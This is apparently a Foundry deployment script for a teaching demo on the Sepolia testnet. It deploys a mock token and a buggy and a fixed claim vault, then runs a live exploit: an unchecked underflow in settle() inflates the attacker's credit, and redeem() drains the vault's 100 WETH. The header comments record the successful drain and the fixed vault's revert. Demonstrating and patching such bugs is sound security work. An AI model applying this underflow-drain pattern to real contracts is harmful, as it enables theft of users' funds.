// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Script.sol";

// -- Proven on Sepolia (public Etherscan) via a Chainstack node -------------------------------
//   vault 0xe93b813f28fa87d587bc1d0d553cebf1a501b3aa
//   1 DRAIN  https://sepolia.etherscan.io/tx/0x0c0be41fbb404d39a547028912a4fd1b4ad40b785c30c278a76b4745fff9cbc5  (Success, vault drained to 0)
//   2 FIXED  https://sepolia.etherscan.io/tx/0xd2577f1509aa82b46b57850cd9438cf59212a2cbf4b14f0019f36e01d4ad1fde  (Fail, execution reverted, arithmetic underflow)
// --------------------------------------------------------------------------------------------

import {MockWETH} from "../src/MockWETH.sol";
import {ClaimVaultBuggy} from "../src/ClaimVaultBuggy.sol";
import {ClaimVaultFixed} from "../src/ClaimVaultFixed.sol";
// Deploys the integer-overflow demo on Sepolia and runs the LIVE drain via unchecked underflow.
contract DeploySepolia is Script {
    function run() external {
        uint256 pk = vm.envUint("PRIVATE_KEY"); address me = vm.addr(pk);
        vm.startBroadcast(pk);
        MockWETH weth = new MockWETH();
        ClaimVaultBuggy vault = new ClaimVaultBuggy(address(weth));
        ClaimVaultFixed vaultFix = new ClaimVaultFixed(address(weth));
        weth.mint(address(vault), 100 ether);      // 100 WETH from other users
        weth.mint(me, 2 ether);                     // attacker's WETH
        // --- LIVE ATTACK on the buggy vault ---
        vault.deposit(1 ether);                     // honest credit = 1
        vault.settle(2 ether);                      // unchecked: 1 - 2 underflows -> credit ~2^256
        vault.redeem(101 ether);                    // redeem the WHOLE vault -> drain
        vaultFix.deposit(1 ether);                  // seed the fixed vault (for the revert demo)
        vm.stopBroadcast();
        console.log("WETH           ", address(weth));
        console.log("ClaimVaultBuggy", address(vault));
        console.log("ClaimVaultFixed", address(vaultFix));
        console.log("Attacker       ", me);
        console.log("attacker WETH  ", weth.balanceOf(me)/1e18);
    }
}
